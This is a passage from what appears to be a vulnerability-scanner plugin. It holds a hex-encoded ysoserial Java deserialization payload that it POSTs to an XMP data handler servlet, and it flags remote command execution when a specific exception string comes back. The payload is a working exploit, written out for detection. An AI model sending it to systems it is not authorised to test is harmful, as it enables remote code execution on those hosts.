0x00,0x0a,0x53,0x6f,0x75,0x72,0x63,0x65,0x46,0x69,0x6c,0x65,0x01,0x00,0x0c,0x47,
0x61,0x64,0x67,0x65,0x74,0x73,0x2e,0x6a,0x61,0x76,0x61,0x0c,0x00,0x0a,0x00,0x0b,
0x07,0x00,0x1a,0x01,0x00,0x23,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,0x61,0x6c,0x2f,
0x70,0x61,0x79,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x47,0x61,
0x64,0x67,0x65,0x74,0x73,0x24,0x46,0x6f,0x6f,0x01,0x00,0x10,0x6a,0x61,0x76,0x61,
0x2f,0x6c,0x61,0x6e,0x67,0x2f,0x4f,0x62,0x6a,0x65,0x63,0x74,0x01,0x00,0x14,0x6a,
0x61,0x76,0x61,0x2f,0x69,0x6f,0x2f,0x53,0x65,0x72,0x69,0x61,0x6c,0x69,0x7a,0x61,
0x62,0x6c,0x65,0x01,0x00,0x1f,0x79,0x73,0x6f,0x73,0x65,0x72,0x69,0x61,0x6c,0x2f,
0x70,0x61,0x79,0x6c,0x6f,0x61,0x64,0x73,0x2f,0x75,0x74,0x69,0x6c,0x2f,0x47,0x61,
0x64,0x67,0x65,0x74,0x73,0x00,0x21,0x00,0x02,0x00,0x03,0x00,0x01,0x00,0x04,0x00,
0x01,0x00,0x1a,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x07,0x00,0x00,0x00,0x02,0x00,
0x08,0x00,0x01,0x00,0x01,0x00,0x0a,0x00,0x0b,0x00,0x01,0x00,0x0c,0x00,0x00,0x00,
0x2f,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x05,0x2a,0xb7,0x00,0x01,0xb1,0x00,0x00,
0x00,0x02,0x00,0x0d,0x00,0x00,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x2f,0x00,0x0e,
0x00,0x00,0x00,0x0c,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x0f,0x00,0x12,0x00,0x00,
0x00,0x02,0x00,0x13,0x00,0x00,0x00,0x02,0x00,0x14,0x00,0x11,0x00,0x00,0x00,0x0a,
0x00,0x01,0x00,0x02,0x00,0x16,0x00,0x10,0x00,0x09,0x70,0x74,0x00,0x04,0x50,0x77,
0x6e,0x72,0x70,0x77,0x01,0x00,0x78,0x75,0x72,0x00,0x12,0x5b,0x4c,0x6a,0x61,0x76,
0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x43,0x6c,0x61,0x73,0x73,0x3b,0xab,0x16,0xd7,
0xae,0xcb,0xcd,0x5a,0x99,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x00,0x01,0x76,0x72,
0x00,0x1d,0x6a,0x61,0x76,0x61,0x78,0x2e,0x78,0x6d,0x6c,0x2e,0x74,0x72,0x61,0x6e,
0x73,0x66,0x6f,0x72,0x6d,0x2e,0x54,0x65,0x6d,0x70,0x6c,0x61,0x74,0x65,0x73,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x70,0x73,0x72,0x00,0x11,
0x6a,0x61,0x76,0x61,0x2e,0x75,0x74,0x69,0x6c,0x2e,0x48,0x61,0x73,0x68,0x4d,0x61,
0x70,0x05,0x07,0xda,0xc1,0xc3,0x16,0x60,0xd1,0x03,0x00,0x02,0x46,0x00,0x0a,0x6c,
0x6f,0x61,0x64,0x46,0x61,0x63,0x74,0x6f,0x72,0x49,0x00,0x09,0x74,0x68,0x72,0x65,
0x73,0x68,0x6f,0x6c,0x64,0x78,0x70,0x3f,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x77,
0x08,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x78,0x78,0x76,0x72,0x00,0x12,0x6a,
0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x4f,0x76,0x65,0x72,0x72,0x69,0x64,
0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x70,0x71,0x00,
0x7e,0x00,0x2e);

url = '/xmp_data_handler_service/xmpDataOperationRequestServlet';

req = http_post_req( port:port,
                     url:url,
                     data:payload );

buf = http_keepalive_send_recv( port:port, data:req );

if( "InstantiateTransformer: Constructor threw an exception" >< buf )
{
  report = 'It was possible to execute a command on the remot host by sending a special crafted java object\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 0 );

